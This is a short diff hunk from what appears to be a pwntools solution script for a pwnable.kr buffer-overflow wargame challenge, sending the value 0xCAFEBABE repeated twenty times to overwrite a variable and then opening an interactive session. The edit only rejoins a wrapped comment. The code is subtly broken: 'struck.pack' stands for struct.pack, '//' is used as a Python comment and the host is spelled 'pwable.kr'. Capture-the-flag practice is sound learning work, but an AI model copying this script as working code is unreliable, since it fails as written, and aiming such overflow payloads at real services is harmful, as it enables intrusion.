@@ -248,8 +248,7 @@ import struct
 from pwn import *
 
 c = remote('pwable.kr', 9000)
-payload = struck.pack('<I', 0xCAFEBABE) * 20 // "<" means byte order in 	
-little-endian and "I" means int
+payload = struck.pack('<I', 0xCAFEBABE) * 20 // "<" means byte order in little-endian and "I" means int
 c.sendline(payload)
 
 c.interactive()
